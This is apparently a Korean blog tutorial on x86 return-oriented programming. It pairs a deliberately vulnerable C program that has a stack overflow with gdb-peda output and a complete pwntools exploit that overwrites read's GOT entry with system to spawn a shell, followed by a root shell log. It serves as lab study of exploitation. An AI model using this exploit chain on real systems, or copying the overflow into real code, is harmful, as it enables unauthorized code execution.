---
title: Return-Oriented Programming - x86
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, return-oriented programming]
math: true
mermaid: true
---

## Description

NXbit와 code signing과 같은 보안 기능이 있는 상태에서 코드 실행 가능하게 해주는 기술이다. RTL + gadgets(해당 프로그램이 사용하는 메모리에 있는 기계어)로 표현된다. gadgets은 일반적으로 ret로 끝나며, 기존 프로그램 또는 공유 라이브러리 코드 내 서브 루틴에 존재한다.

## Proof of concept

```c
// gcc -m32 -fno-stack-protector -o rop rop.c
#include <stdio.h>
#include <unistd.h>
  
void vuln(){
    char buf[50];
    read(0, buf, 256);
}
 
void main(){
    write(1,"Hello ROP\n",10);
    vuln();
}
```

256byte를 read 하여 overflow가 발생한다.

## Exploit Mehtod

1. read 함수를 통해 "/bin/sh" 명령을 쓰기 가능한 메모리에 저장
2. write 함수를 이용해 read 함수의 .got 영역에 저장된 값 출력
3. read 함수를 이용해 read 함수의 .got 영역에 system 함수 주소를 덮어씀
4. read 함수 호출 - read .got 영역에 system 주소 저장되어 있기 떄문에 system 함수가 호출

```c
read(0,writableArea,len(str(binsh)))
write(1,read_got,len(str(read_got)))
read(0,read_got,len(str(read_got)))
system(writableArea)
```

**writable area**

```
gdb-peda$ shell cat /proc/26912/maps
08048000-08049000 r-xp 00000000 08:01 131514     /home/pwner/test/rop
08049000-0804a000 r--p 00000000 08:01 131514     /home/pwner/test/rop
0804a000-0804b000 rw-p 00001000 08:01 131514     /home/pwner/test/rop  <--- 변하지 않는 writable 영역
b7d43000-b7d44000 rw-p 00000000 00:00 0 
b7d44000-b7ef4000 r-xp 00000000 08:01 393587     /lib/i386-linux-gnu/libc-2.23.so
b7ef4000-b7ef6000 r--p 001af000 08:01 393587     /lib/i386-linux-gnu/libc-2.23.so
b7ef6000-b7ef7000 rw-p 001b1000 08:01 393587     /lib/i386-linux-gnu/libc-2.23.so
b7ef7000-b7efa000 rw-p 00000000 00:00 0 
b7f10000-b7f11000 rw-p 00000000 00:00 0 
b7f11000-b7f14000 r--p 00000000 00:00 0          [vvar]
b7f14000-b7f16000 r-xp 00000000 00:00 0          [vdso]
b7f16000-b7f39000 r-xp 00000000 08:01 393559     /lib/i386-linux-gnu/ld-2.23.so
b7f39000-b7f3a000 r--p 00022000 08:01 393559     /lib/i386-linux-gnu/ld-2.23.so
b7f3a000-b7f3b000 rw-p 00023000 08:01 393559     /lib/i386-linux-gnu/ld-2.23.so
bfae5000-bfb06000 rw-p 00000000 00:00 0          [stack]
```

**section**

```
gdb-peda$ shell objdump -h rop
rop:     file format elf32-i386
Sections:
Idx Name          Size      VMA       LMA       File off  Algn
0 .interp       00000013  08048154  08048154  00000154  20
                CONTENTS, ALLOC, LOAD, READONLY, DATA
                        >> snip... <<
                CONTENTS, ALLOC, LOAD, DATA
22 .got          00000004  08049ffc  08049ffc  00000ffc  22  
                CONTENTS, ALLOC, LOAD, DATA
23 .got.plt      00000018  0804a000  0804a000  00001000  22 <-- .got.plt
                CONTENTS, ALLOC, LOAD, DATA
24 .data         00000008  0804a018  0804a018  00001018  22 <-- .data
                CONTENTS, ALLOC, LOAD, DATA
25 .bss          00000004  0804a020  0804a020  00001020  20 <-- .bss
                ALLOC
26 .comment      00000035  00000000  00000000  00001020  20
                CONTENTS, READONLY
```

**gadgets**

```
gdb-peda$ ropgadget
ret = 0x80482d2
popret = 0x80482e9
pop2ret = 0x80484ea
pop3ret = 0x80484e9
pop4ret = 0x80484e8
addesp_12 = 0x80482e6
addesp_16 = 0x80483a5
```

**symbols**

```
gdb-peda$ elfsymbol read
Detail symbol info
read@reloc = 0
read@plt = 0x8048300
read@got = 0x804a00c
gdb-peda$ elfsymbol write
Detail symbol info
write@reloc = 0x10
write@plt = 0x8048320
write@got = 0x804a014
```

system의 offset을 계산한다.

```
gdb-peda$ p read
$1 = {<text variable, no debug info>} 0xb7e90b00 <read>
gdb-peda$ p system
$3 = {<text variable, no debug info>} 0xb7df5da0 <__libc_system>
gdb-peda$ p 0xb7e90b00-0xb7df5da0
$4 = 0x9ad60
```

## Exploit code

```python
# Exploit Code
from pwn import *
from struct import *

binsh = "/bin/sh"
binary = ELF("./rop")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
writableArea = 0x0804a050
read_got = binary.got['read']
read_plt = binary.plt['read']
read_system_offset = libc.symbols['read'] - libc.symbols['system']

rop = ROP(binary)

rop.read(0,writableArea,len(str(binsh)))
rop.write(1,read_got,4)
rop.read(0,read_got,len(str(read_got)))
rop.raw(read_plt)
rop.raw(0xaaaaaaaa)
rop.raw(writableArea)

payload = "A"*62 + str(rop)

p = process('./rop')
context.log_level = 'debug'

print(p.recvn(10))
p.send(payload+'\n')
p.send(binsh)
read = u32(p.recvn(4))
system_addr = read - read_system_offset

rop = ROP(binary)
rop.raw(system_addr)
p.send(str(rop))

p.interactive()
```

## Exploit

```
[DEBUG] Received 0x27 bytes:
    'uid=0(root) gid=0(root) groups=0(root)n'
uid=0(root) gid=0(root) groups=0(root)
$ pwd
[DEBUG] Sent 0x4 bytes:
    'pwdn'
[DEBUG] Received 0x11 bytes:
    '/home/pwner/testn'
/home/pwner/test
```

## Refereces
- [01.ROP(Return Oriented Programming)-x86](https://www.lazenca.net/display/TEC/01.ROP%28Return+Oriented+Programming%29-x86)